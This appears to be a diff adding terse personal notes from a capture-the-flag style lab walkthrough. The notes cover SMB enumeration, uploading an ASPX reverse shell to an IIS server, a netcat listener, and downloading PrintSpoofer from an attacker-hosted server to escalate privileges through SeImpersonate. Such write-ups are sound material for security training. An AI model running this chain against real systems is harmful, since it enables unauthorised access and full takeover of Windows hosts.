@@ -1,0 +1,33 @@
+    -sC to run default scripts
+    -sV to enumerate applications versions
+    
+smbclient -L ip
+
+
+passwords from smb we can decode via online web services , its base64
+
+put shell.aspx # because of ,icrosoft iis
+49663
+get shell from github
+
+https://github.com/borjmz/aspx-reverse-shell.git
+
+??? port 49663 using LFI
+http://ip:49663/nt4wrksv/shell.aspx
+
+nc -nvlp 4444
+
+
+
+whoami /priv
+
+
+we found SeImpersonate enabled!
+
+using https://github.com/dievus/printspoofer.git to elevate priveleges
+
+Invoke-WebRequest http://10.10.134.240:8080/PrintSpoofer.exe -OutFile printspoofer.exe
+Invoke-WebRequest -URI http://10.10.134.240:8080/PrintSpoofer.exe  -OutFile PrintSpoofer.exe
+
+
+PrintSpoofer.exe -i -c cmd
